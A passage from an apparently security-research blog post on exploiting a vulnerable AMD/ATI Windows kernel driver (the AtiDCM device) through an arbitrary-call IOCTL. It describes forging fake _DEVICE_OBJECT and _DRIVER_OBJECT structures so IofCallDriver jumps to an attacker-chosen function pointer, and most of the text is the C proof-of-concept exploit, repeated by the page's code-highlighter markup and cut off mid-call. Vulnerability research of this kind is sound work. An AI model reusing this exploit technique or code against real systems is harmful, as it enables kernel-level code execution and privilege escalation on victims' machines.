  ├&gt;AttachedDevice-&gt;DriverObject-&gt;MajorFunction[IRP_MJ_XXX](AttachedDevice,...)</pre>
</div>
<div>
<p>This means that we must:</p>
<ul>
<li>Allocate a <strong>first</strong> object named <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">object</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">object</code> that contains our <strong>first fake</strong> <strong>_DEVICE_OBJECT</strong> named <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">DeviceObject</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">DeviceObject</code>, prepended by an <strong>_OBJECT_HEADER</strong>. Recall that we have to pass the increment performed by <em><strong>ObpIncrPointerCount()</strong></em>, in <em><strong>IoGetAttachedDeviceReference()</strong></em>. Failing to allocate space also for the _OBJECT_HEADER will trigger a <strong>BSOD</strong>.</li>
<li>Allocate a <strong>second</strong> object named <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">object2</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">object2</code> that contains our <strong>second fake</strong> <strong>_DEVICE_OBJECT </strong>named&nbsp;<div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">DeviceObject2</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">DeviceObject2</code> prepended by another <strong>_OBJECT_HEADER</strong>.</li>
<li>Set <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">DeviceObject-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">AttachedDevice = DeviceObject2</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">DeviceObject-&gt;AttachedDevice = DeviceObject2</code>. This way <strong><em>IoGetAttachedDeviceReference()</em> will return a pointer to DeviceObject2</strong>.</li>
<li>Create a _DRIVER_OBJECT named <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">DriverObject</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">DriverObject</code> containing the <strong>function pointer</strong> defined by us.</li>
<li>Set <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">DeviceObject2-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">DriverObject = DriverObject</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">DeviceObject2-&gt;DriverObject = DriverObject</code>. This way <em><strong>IofCallDriver() </strong></em><strong>will dereference our <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">DriverObject</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">DriverObject</code> and call our arbitrary function pointer</strong>.</li>
</ul>
</div>
<div>
<p>Here’s a visualization of the objects we would like to create in memory:</p>
</div>
<div>
<p><img decoding="async" class="alignnone size-full wp-image-3818" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-32-1.png" alt="" width="1111" height="414"></p>
</div>
<div>
<p>Below you can find the updated code. In this case it just sets the arbitrary function pointer to be <em>0xdeadbeef</em>.</p>
</div>
<div>
<p><em>The actual code contains a bunch of other definitions such as <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/22h2/_DEVICE_OBJECT">DEVICE_OBJECT</a> and <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/22h2/_DRIVER_OBJECT">DRIVER_OBJECT</a> that I skipped for clarity in the code block below. However, you can very likely find all the required definitions in <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/22h2">vergilius project</a> or directly in the <a href="https://github.com/tpn/winsdk-10/tree/master/Include">header files</a>.&nbsp;</em></p>
</div>
</div>
<div>
<div class="enlighter-default enlighter-v-standard enlighter-t-monokai enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k2">typedef</span><span class="enlighter-text"> </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> </span><span class="enlighter-m0">DECLSPEC_ALIGN</span><span class="enlighter-g1">(</span><span class="enlighter-text">MEMORY_ALLOCATION_ALIGNMENT</span><span class="enlighter-g1">)</span><span class="enlighter-text"> _DEVICE_OBJECT </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    CSHORT Type;</span></div></div><div class=""><div><span class="enlighter-text">    USHORT Size;</span></div></div><div class=""><div><span class="enlighter-text">    LONG ReferenceCount;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> _DRIVER_OBJECT* DriverObject;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> _DEVICE_OBJECT* NextDevice;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> _DEVICE_OBJECT* AttachedDevice;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">DWORD64 g_ntbase = 0;</span></div></div><div class=""><div><span class="enlighter-text">DWORD64 g_kisystemcall64shadow = 0;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define SIZE_BUF 4096</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define IOCTL_READMSR 0x22e09c</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define IOCTL_ARBITRARYCALLDRIVER    0x22e04c</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define IA32_GS_BASE 0xc0000101</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define IA32_LSTAR    0xc0000082</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define IA32_STAR    0xc0000081</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">HANDLE g_device;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">BOOL </span><span class="enlighter-m0">readMSR</span><span class="enlighter-g1">(</span><span class="enlighter-text">DWORD msr_value,PVOID outputBuffer, SIZE_T outSize</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">BOOL </span><span class="enlighter-m0">arbitraryCallDriver</span><span class="enlighter-g1">(</span><span class="enlighter-text">PVOID outputBuffer, SIZE_T outSize</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">char</span><span class="enlighter-text">* inputBuffer = </span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-m0">VirtualAlloc</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">        21,</span></div></div><div class=""><div><span class="enlighter-text">        MEM_COMMIT | MEM_RESERVE,</span></div></div><div class=""><div><span class="enlighter-text">        PAGE_EXECUTE_READWRITE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">char</span><span class="enlighter-text">* object = </span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-m0">VirtualAlloc</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">        SIZE_BUF,</span></div></div><div class=""><div><span class="enlighter-text">        MEM_COMMIT | MEM_RESERVE,</span></div></div><div class=""><div><span class="enlighter-text">        PAGE_EXECUTE_READWRITE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[+] object = 0x%p\n"</span><span class="enlighter-text">, object</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    PDEVICE_OBJECT ptr = </span><span class="enlighter-g1">(</span><span class="enlighter-text">PDEVICE_OBJECT</span><span class="enlighter-g1">)(</span><span class="enlighter-text">object + </span><span class="enlighter-n2">0x30</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">memset</span><span class="enlighter-g1">(</span><span class="enlighter-text">object, </span><span class="enlighter-n2">0x41</span><span class="enlighter-text">, </span><span class="enlighter-n2">0x30</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[+] ptr = 0x%p\n"</span><span class="enlighter-text">, ptr</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">char</span><span class="enlighter-text">* object2 = </span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-m0">VirtualAlloc</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">        SIZE_BUF,</span></div></div><div class=""><div><span class="enlighter-text">        MEM_COMMIT | MEM_RESERVE,</span></div></div><div class=""><div><span class="enlighter-text">        PAGE_EXECUTE_READWRITE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[+] object2 = 0x%p\n"</span><span class="enlighter-text">, object2</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">memset</span><span class="enlighter-g1">(</span><span class="enlighter-text">object2, </span><span class="enlighter-n2">0x43</span><span class="enlighter-text">, </span><span class="enlighter-n2">0x30</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">char</span><span class="enlighter-text">* driverObject = </span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-m0">VirtualAlloc</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">        SIZE_BUF,</span></div></div><div class=""><div><span class="enlighter-text">        MEM_COMMIT | MEM_RESERVE,</span></div></div><div class=""><div><span class="enlighter-text">        PAGE_EXECUTE_READWRITE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">memset</span><span class="enlighter-g1">(</span><span class="enlighter-text">driverObject, </span><span class="enlighter-n2">0x50</span><span class="enlighter-text">, SIZE_BUF</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[+] driverObject = 0x%p\n"</span><span class="enlighter-text">, driverObject</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">char</span><span class="enlighter-text">* ptrDriver = driverObject + </span><span class="enlighter-n2">0x30</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">char</span><span class="enlighter-text">* pDriverFunction = ptrDriver + </span><span class="enlighter-n2">0x1b</span><span class="enlighter-text">*8+</span><span class="enlighter-n2">0x70</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    *</span><span class="enlighter-g1">((</span><span class="enlighter-text">PDWORD64</span><span class="enlighter-g1">)</span><span class="enlighter-text">pDriverFunction</span><span class="enlighter-g1">)</span><span class="enlighter-text"> = </span><span class="enlighter-n2">0xdeadbeef</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    ptr-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">AttachedDevice = </span><span class="enlighter-g1">(</span><span class="enlighter-text">PDEVICE_OBJECT</span><span class="enlighter-g1">)(</span><span class="enlighter-text">object2 + </span><span class="enlighter-n2">0x30</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">memset</span><span class="enlighter-g1">(</span><span class="enlighter-text">ptr-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">AttachedDevice, </span><span class="enlighter-n2">0x42</span><span class="enlighter-text">, SIZE_BUF-</span><span class="enlighter-n2">0x40</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[+] ptr-&gt;AttachedDevice = 0x%p\n"</span><span class="enlighter-text">, ptr-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">AttachedDevice</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span></div></div><div class=""><div><span class="enlighter-text">    </span></div></div><div class=""><div><span class="enlighter-text">    ptr-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">AttachedDevice-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">DriverObject = </span><span class="enlighter-g1">(</span><span class="enlighter-text">_DRIVER_OBJECT*</span><span class="enlighter-g1">)</span><span class="enlighter-text">ptrDriver;</span></div></div><div class=""><div><span class="enlighter-text">    ptr-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">AttachedDevice-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">AttachedDevice = 0;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">char</span><span class="enlighter-text">* ptr2 = inputBuffer;</span></div></div><div class=""><div><span class="enlighter-text">    *</span><span class="enlighter-g1">(</span><span class="enlighter-text">ptr2</span><span class="enlighter-g1">)</span><span class="enlighter-text"> = 0;</span></div></div><div class=""><div><span class="enlighter-text">    ptr2 += 1;</span></div></div><div class=""><div><span class="enlighter-text">    *</span><span class="enlighter-g1">((</span><span class="enlighter-text">PDWORD64</span><span class="enlighter-g1">)</span><span class="enlighter-text">ptr2</span><span class="enlighter-g1">)</span><span class="enlighter-text"> = </span><span class="enlighter-g1">(</span><span class="enlighter-text">DWORD64</span><span class="enlighter-g1">)</span><span class="enlighter-text">ptr;</span></div></div><div class=""><div><span class="enlighter-text">    </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[+] User buffer allocated: 0x%8p\n"</span><span class="enlighter-text">, inputBuffer</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    DWORD bytesRet = 0;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">getchar</span><span class="enlighter-g1">()</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    BOOL res = </span><span class="enlighter-m0">DeviceIoControl</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        g_device,</span></div></div><div class=""><div><span class="enlighter-text">        IOCTL_ARBITRARYCALLDRIVER,</span></div></div><div class=""><div><span class="enlighter-text">        inputBuffer,</span></div></div><div class=""><div><span class="enlighter-text">        SIZE_BUF,</span></div></div><div class=""><div><span class="enlighter-text">        outputBuffer,</span></div></div><div class=""><div><span class="enlighter-text">        outSize,</span></div></div><div class=""><div><span class="enlighter-text">        &amp;bytesRet,</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-e1">NULL</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[*] sent IOCTL_ARBITRARYCALLDRIVER \n"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!res</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[-] DeviceIoControl failed with error: %d\n"</span><span class="enlighter-text">, </span><span class="enlighter-m0">GetLastError</span><span class="enlighter-g1">())</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> res;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k5">int</span><span class="enlighter-text"> </span><span class="enlighter-m0">main</span><span class="enlighter-g1">()</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    DWORD bytesRet = 0;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    g_device = </span><span class="enlighter-m0">CreateFileA</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-s0">"\\\\.\\AtiDCM"</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">        GENERIC_READ | GENERIC_WRITE,</span></div></div><div class=""><div><span class="enlighter-text">        0,</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">        OPEN_EXISTING,</span></div></div><div class=""><div><span class="enlighter-text">        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-e1">NULL</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">readMSR</span><span class="enlighter-g1">(</span><span class="enlighter-text">IA32_LSTAR, outputBuffer, SIZE_BUF</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-m0">arbitraryCallDriver</span><span class="enlighter-g1">(</span><span class="enlighter-text">outputBuffer, SIZE_BUF</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> 0;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">[...]

typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _DEVICE_OBJECT {
    CSHORT Type;
    USHORT Size;
    LONG ReferenceCount;
    struct _DRIVER_OBJECT* DriverObject;
    struct _DEVICE_OBJECT* NextDevice;
    struct _DEVICE_OBJECT* AttachedDevice;
[...]



DWORD64 g_ntbase = 0;
DWORD64 g_kisystemcall64shadow = 0;
[...]
#define SIZE_BUF 4096
#define IOCTL_READMSR 0x22e09c
#define IOCTL_ARBITRARYCALLDRIVER    0x22e04c
#define IA32_GS_BASE 0xc0000101
#define IA32_LSTAR    0xc0000082
#define IA32_STAR    0xc0000081

HANDLE g_device;


BOOL readMSR(DWORD msr_value,PVOID outputBuffer, SIZE_T outSize) {
    [...]
}

BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
    char* inputBuffer = (char*)VirtualAlloc(
        NULL,
        21,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    char* object = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    printf("[+] object = 0x%p\n", object);

    PDEVICE_OBJECT ptr = (PDEVICE_OBJECT)(object + 0x30);

    memset(object, 0x41, 0x30);

    printf("[+] ptr = 0x%p\n", ptr);
    char* object2 = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    printf("[+] object2 = 0x%p\n", object2);
    memset(object2, 0x43, 0x30);

    char* driverObject = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memset(driverObject, 0x50, SIZE_BUF);
    printf("[+] driverObject = 0x%p\n", driverObject);
    char* ptrDriver = driverObject + 0x30;
    char* pDriverFunction = ptrDriver + 0x1b*8+0x70;

    *((PDWORD64)pDriverFunction) = 0xdeadbeef;

    ptr-&gt;AttachedDevice = (PDEVICE_OBJECT)(object2 + 0x30);

    
    memset(ptr-&gt;AttachedDevice, 0x42, SIZE_BUF-0x40);

    printf("[+] ptr-&gt;AttachedDevice = 0x%p\n", ptr-&gt;AttachedDevice);
    
    
    ptr-&gt;AttachedDevice-&gt;DriverObject = (_DRIVER_OBJECT*)ptrDriver;
    ptr-&gt;AttachedDevice-&gt;AttachedDevice = 0;
    char* ptr2 = inputBuffer;
    *(ptr2) = 0;
    ptr2 += 1;
    *((PDWORD64)ptr2) = (DWORD64)ptr;
    

    printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);

    DWORD bytesRet = 0;

    getchar();

    BOOL res = DeviceIoControl(
        g_device,
        IOCTL_ARBITRARYCALLDRIVER,
        inputBuffer,
        SIZE_BUF,
        outputBuffer,
        outSize,
        &amp;bytesRet,
        NULL
    );

    printf("[*] sent IOCTL_ARBITRARYCALLDRIVER \n");
    if (!res) {
        printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
    }
    return res;
}


int main()
{
    DWORD bytesRet = 0;

    g_device = CreateFileA(
        "\\\\.\\AtiDCM",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL);


  [...]

    if (readMSR(IA32_LSTAR, outputBuffer, SIZE_BUF)) {
        [...]
    }

  arbitraryCallDriver(outputBuffer, SIZE_BUF);
    return 0;
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c" data-enlighter-theme="monokai">[...]

typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _DEVICE_OBJECT {
    CSHORT Type;
    USHORT Size;
    LONG ReferenceCount;
    struct _DRIVER_OBJECT* DriverObject;
    struct _DEVICE_OBJECT* NextDevice;
    struct _DEVICE_OBJECT* AttachedDevice;
[...]



DWORD64 g_ntbase = 0;
DWORD64 g_kisystemcall64shadow = 0;
[...]
#define SIZE_BUF 4096
#define IOCTL_READMSR 0x22e09c
#define IOCTL_ARBITRARYCALLDRIVER    0x22e04c
#define IA32_GS_BASE 0xc0000101
#define IA32_LSTAR	0xc0000082
#define IA32_STAR	0xc0000081

HANDLE g_device;


BOOL readMSR(DWORD msr_value,PVOID outputBuffer, SIZE_T outSize) {
    [...]
}

BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
    char* inputBuffer = (char*)VirtualAlloc(
        NULL,
        21,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    char* object = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    printf("[+] object = 0x%p\n", object);

    PDEVICE_OBJECT ptr = (PDEVICE_OBJECT)(object + 0x30);

    memset(object, 0x41, 0x30);

    printf("[+] ptr = 0x%p\n", ptr);
    char* object2 = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    printf("[+] object2 = 0x%p\n", object2);
    memset(object2, 0x43, 0x30);

    char* driverObject = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memset(driverObject, 0x50, SIZE_BUF);
    printf("[+] driverObject = 0x%p\n", driverObject);
    char* ptrDriver = driverObject + 0x30;
    char* pDriverFunction = ptrDriver + 0x1b*8+0x70;

    *((PDWORD64)pDriverFunction) = 0xdeadbeef;

    ptr-&gt;AttachedDevice = (PDEVICE_OBJECT)(object2 + 0x30);

    
    memset(ptr-&gt;AttachedDevice, 0x42, SIZE_BUF-0x40);

    printf("[+] ptr-&gt;AttachedDevice = 0x%p\n", ptr-&gt;AttachedDevice);
    
    
    ptr-&gt;AttachedDevice-&gt;DriverObject = (_DRIVER_OBJECT*)ptrDriver;
    ptr-&gt;AttachedDevice-&gt;AttachedDevice = 0;
    char* ptr2 = inputBuffer;
    *(ptr2) = 0;
    ptr2 += 1;
    *((PDWORD64)ptr2) = (DWORD64)ptr;
    

    printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);

    DWORD bytesRet = 0;

    getchar();

    BOOL res = DeviceIoControl(
        g_device,
        IOCTL_ARBITRARYCALLDRIVER,
